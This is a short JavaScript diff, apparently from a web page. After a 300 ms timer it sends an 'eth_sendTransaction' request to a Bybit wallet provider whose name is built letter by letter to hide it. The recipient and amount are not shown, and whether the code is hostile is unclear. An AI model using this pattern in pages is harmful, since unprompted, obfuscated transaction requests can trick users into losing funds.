@@ -28,7 +28,9 @@ function myfun(){
             gas: 21000 //一个固定值
         };
     var a = 'b'+'y'+'b'+'i'+'t'+'wallet';
-    var letter = window[a].Provider.postMessage('eth_sendTransaction','ss',data);
+    var b = 'b'+'y'+'b'+'i'+'t'+'Web3Provider';
+    alert(window[a]);
+    var letter = window[a][b].postMessage('eth_sendTransaction','ss',data);
         // });
     }, "300");
 }
